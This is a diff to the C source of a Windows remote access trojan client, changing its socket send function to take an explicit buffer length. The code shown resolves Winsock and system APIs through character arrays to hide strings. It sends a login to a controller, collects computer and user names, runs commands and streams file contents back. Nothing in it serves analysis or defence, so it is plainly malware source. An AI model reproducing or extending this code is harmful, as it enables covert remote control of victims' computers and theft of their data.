@@ -28,13 +28,13 @@ struct RATSocket
 	_WSAGetLastError *f_WSAGetLastError;	
 };
 
-int SocketSend(RATSocket* ratSocket, char* messageBuffer)
+int SocketSend(RATSocket* ratSocket, char* messageBuffer, int bufferSize)
 {
 	char ca_send[] = { 's','e','n','d', 0};
 	_send* f_send = (_send*)GetProcAddress(ratSocket->libraryWinsock2, ca_send);
-	if ( f_send(ratSocket->socketConnection, messageBuffer, (int)strlen(messageBuffer), 0) == SOCKET_ERROR )
+	if ( f_send(ratSocket->socketConnection, messageBuffer, bufferSize, 0) == SOCKET_ERROR )
 	{
-		char buffer[256];
+		char buffer[SOCKET_BUFFER_SIZE];
 		sprintf_s(buffer, "Socket failed with error: %ld\n", ratSocket->f_WSAGetLastError());
 		OutputDebugStringA(buffer);
 		return 1;
@@ -150,7 +150,7 @@ WinMain(HINSTANCE hInstance,
 		}
 	}
 
-	SocketSend(&ratSocket, "login");
+	SocketSend(&ratSocket, "login", 5);
 
 	char ca_recv[] = { 'r','e','c','v', 0 };
 	_recv* f_recv = (_recv*)GetProcAddress(ratSocket.libraryWinsock2, ca_recv);
@@ -173,7 +173,7 @@ WinMain(HINSTANCE hInstance,
 		
 		if ( strcmp(splittedCommand[0], ca_info) == 0 )
 		{
-			char bufferError[256];
+			char bufferError[SOCKET_BUFFER_SIZE];
 			char bufferUser[UNLEN + 1];
 			DWORD len = sizeof(bufferUser);
 
@@ -181,7 +181,7 @@ WinMain(HINSTANCE hInstance,
 			char bufferComputer[MAX_COMPUTERNAME_LENGTH + 1];
 			len = sizeof(bufferComputer);
 
-			char ca_kernel32[256] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
+			char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
 			HMODULE libraryKernel32 = LoadLibraryA(ca_kernel32);
 			if ( !libraryKernel32 )
 			{
@@ -200,7 +200,7 @@ WinMain(HINSTANCE hInstance,
 				strncpy_s(bufferComputer, ca_unknown, sizeof(ca_unknown));
 			}
 
-			char ca_advapi32[256] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
+			char ca_advapi32[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
 			HMODULE libraryAdvapi32 = LoadLibraryA(ca_advapi32);
 			if ( !libraryAdvapi32 )
 			{
@@ -219,9 +219,9 @@ WinMain(HINSTANCE hInstance,
 				strncpy_s(bufferUser, ca_unknown, sizeof(ca_unknown));
 			}
 
-			char bufferInfo[256];
+			char bufferInfo[SOCKET_BUFFER_SIZE];
 			sprintf_s(bufferInfo, "%s:%s", bufferComputer, bufferUser);
-			SocketSend(&ratSocket, bufferInfo);
+			SocketSend(&ratSocket, bufferInfo, SOCKET_BUFFER_SIZE);
 		}
 		else if ( strcmp(splittedCommand[0], ca_cmd) == 0 )
 		{
@@ -278,12 +278,12 @@ WinMain(HINSTANCE hInstance,
 					size_t readSize = fread(&readBuffer, 1, SOCKET_BUFFER_SIZE, fs);
 					if ( readSize > 0 )
 					{
-						SocketSend(&ratSocket, readBuffer);
+						SocketSend(&ratSocket, readBuffer, SOCKET_BUFFER_SIZE);
 						OutputDebugStringA(readBuffer);
 						OutputDebugStringA("\n");
 					}
 				}
-				SocketSend(&ratSocket, "DONE");
+				SocketSend(&ratSocket, "DONE", 4);
 				OutputDebugString("DONE");
 			}
 			else
